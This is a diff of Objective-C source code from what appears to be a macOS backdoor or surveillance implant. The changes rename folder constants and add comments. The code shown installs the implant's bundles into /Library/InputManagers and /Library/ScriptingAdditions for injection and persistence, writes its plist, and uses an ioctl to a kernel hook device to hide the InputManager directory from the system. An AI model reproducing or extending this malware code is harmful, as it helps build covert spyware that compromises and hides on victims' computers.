@@ -2053,8 +2053,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
-                       INPUT_MANAGER_FOLDER,
-                       INPUT_MANAGER_FOLDER,
+                       EXT_BUNDLE_FOLDER,
+                       EXT_BUNDLE_FOLDER,
                        gInputManagerName];
   
   NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -2090,8 +2090,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   _backdoorContentPath = [NSString stringWithFormat:
                           @"/Library/InputManagers/%@/%@.bundle/Contents/Info.plist",
-                          INPUT_MANAGER_FOLDER,
-                          INPUT_MANAGER_FOLDER ];
+                          EXT_BUNDLE_FOLDER,
+                          EXT_BUNDLE_FOLDER];
   
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
@@ -2128,7 +2128,7 @@ static void computerWillShutdown(CFMachPortRef port,
 
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
-                       OSAX_FOLDER,
+                       EXT_BUNDLE_FOLDER,
                        gInputManagerName];
 
 #ifdef DEBUG_CORE
@@ -2562,11 +2562,15 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
 
+  //
   // Get OS version
+  //
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
 
+  
+  
   NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
                            [[NSBundle mainBundle] bundlePath]];
   
@@ -2610,7 +2614,8 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 
   //
-  // Resize shared mem if needed
+  // Resize shared mem if needed, on default installation we need to increase
+  // this values
   //
   [self _resizeSharedMemoryWindow];
   
@@ -2886,7 +2891,8 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
           infoLog(@"Hiding InputManager");
 #endif
-          NSString *inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
+          NSString *inputManagerPath = [[NSString alloc]
+                                        initWithString: EXT_BUNDLE_FOLDER];
           
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
@@ -2898,7 +2904,7 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
           //infoLog(@"Hiding OSAX");
 #endif
-//          NSString *osaxPath = [[NSString alloc] initWithString: OSAX_FOLDER];
+//          NSString *osaxPath = [[NSString alloc] initWithString: EXT_BUNDLE_FOLDER];
 //          // Hiding input manager dir
 //          ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[osaxPath fileSystemRepresentation]);
 //          
